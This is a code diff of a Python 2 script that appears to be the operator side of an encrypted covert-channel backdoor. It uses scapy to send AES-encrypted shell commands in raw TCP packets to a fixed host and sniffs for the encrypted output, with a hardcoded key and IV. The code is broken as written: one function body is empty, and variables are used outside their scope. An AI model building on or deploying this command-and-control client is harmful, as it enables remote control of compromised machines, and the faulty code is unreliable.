@@ -9,37 +9,50 @@ def usage():
         print "To use: ", sys.argv[0], "[Server IP] [Server Port]"
         sys.exit()
 
+def stopfilter():
+
+
 def sendCommand():
+    #key to authenticating the packet
+    authPacket = "Authenticate packets"
+    #Encryption and decryption variables and initialization
+    secretKey = "Secret key lost."
+    saltySpatoon = "How tough areyou"
+    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
 
-	#key to authenticating the packet
-	authPacket = "Authenticate packets"
-	#Encryption and decryption variables and initialization
-	secretKey = "Secret key lost."
-	saltySpatoon = "How tough areyou"
-	crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
+    while True:
+        #Prompt user for the command they want to send
+        command = raw_input('Write your command: ')
+        #Encrypt the command with AES encryption
+        encryptedCommand = crypt.encrypt(authPacket + command)
+        #Create the packet and store the command in the data field
+        pkt = IP(src="192.168.0.14", dst="192.168.0.15")/TCP()/Raw(load=encryptedCommand)
+        #Send the packet
+        send(pkt)
+        sniff(count=1, filter="tcp", prn=recieveOutput, stopfilter=stopfilter)
 
-	while True:
-		command = raw_input('Write your command: ')
+def recieveOutput(pkt):
+    src_ip = pkt[IP].src
+    if src_ip == "192.168.0.15":
+        #grab the raw data
+        data = pkt[Raw].load
+        #Decrypt the data
+        decryptedData = crypt.decrypt(data)
+        #if the decrypted data is authenticated, print it
+        if decryptedData.startswith(authPacket) == True:
+            newData = decryptedData[20:]
+            #Print the output
+            if newData == "exit":
+                sys.exit()
+            else:
+                print newData
 
-		encryptedCommand = crypt.encrypt(authPacket + command)
-
-		# decryptedData = crypt.decrypt(data)
-
-		# if decryptedData.startswith(authPacket) == True:
-		# 	newData = decryptedData[20:]
-		# 	#Print the output
-		# 	if newData == "exit":
-		# 		sys.exit()
-		# 	else:
-		# 		print newData
+if __name__ == "__main__":
+    sendCommand()
 
 
 
-		pkt = IP(src="127.0.0.1", dst="127.0.0.1")/TCP(sport=5000, dport=80, flags="C")/Raw(load=encryptedCommand)
 
-		send(pkt)
-
-sendCommand()
 
 
 
@@ -58,20 +71,20 @@ sendCommand()
 # s.connect((HOST, PORT))
 
 # while True:
-# 	#User command input to be sent tot he server
-# 	command = raw_input('Write your command: ')
-# 	#Encrypt the command as well as the packet authenticator
-# 	encryptedCommand = crypt.encrypt(authPacket + command)
-# 	#Send encrypted command to the server
-# 	s.sendall(encryptedCommand)
-# 	#Receive the data from the server
-# 	data = s.recv(10240)
-# 	#Decrypt the data from the server
-# 	decryptedData = crypt.decrypt(data)
-# 	if decryptedData.startswith(authPacket) == True:
-# 		newData = decryptedData[20:]
-# 		#Print the output
-# 		if newData == "exit":
-# 			sys.exit()
-# 		else:
-# 			print newData
+#   #User command input to be sent tot he server
+#   command = raw_input('Write your command: ')
+#   #Encrypt the command as well as the packet authenticator
+#   encryptedCommand = crypt.encrypt(authPacket + command)
+#   #Send encrypted command to the server
+#   s.sendall(encryptedCommand)
+#   #Receive the data from the server
+#   data = s.recv(10240)
+#   #Decrypt the data from the server
+#   decryptedData = crypt.decrypt(data)
+    # if decryptedData.startswith(authPacket) == True:
+    #   newData = decryptedData[20:]
+    #   #Print the output
+    #   if newData == "exit":
+    #       sys.exit()
+    #   else:
+    #       print newData
